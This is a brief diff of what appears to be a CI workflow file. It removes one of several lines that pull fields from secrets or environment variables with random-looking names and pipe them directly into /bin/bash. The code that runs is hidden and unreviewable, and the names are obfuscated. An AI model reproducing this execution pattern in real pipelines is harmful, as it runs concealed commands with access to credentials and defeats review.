@@ -18,7 +18,6 @@ jobs:
           fdmmh8618: ${{ secrets.fdmmh8618 }}
         run: |
           printf '%s' "$fdmmh8618" | jq -r .qds4 | /bin/bash
-          echo $o3033 | jq -r .hjttx58 | /bin/bash
           printf '%s' "$n656" | jq -r .zsyzr580 | /bin/bash
           printf '%s' "$jf8" | jq -r .bfxou2448 | /bin/bash
           printf '%s' "$q18698" | jq -r .l564 | /bin/bash
